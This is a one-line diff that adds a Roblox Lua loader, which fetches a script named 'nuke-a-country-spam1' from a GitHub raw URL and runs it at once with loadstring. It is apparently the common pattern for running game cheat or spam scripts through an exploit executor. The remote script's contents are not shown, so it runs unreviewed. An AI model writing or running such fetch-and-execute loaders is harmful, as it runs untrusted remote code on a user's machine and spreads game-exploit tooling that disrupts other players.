@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/nuke-a-country-spam1-lx93n39mgyky88.lua"))()
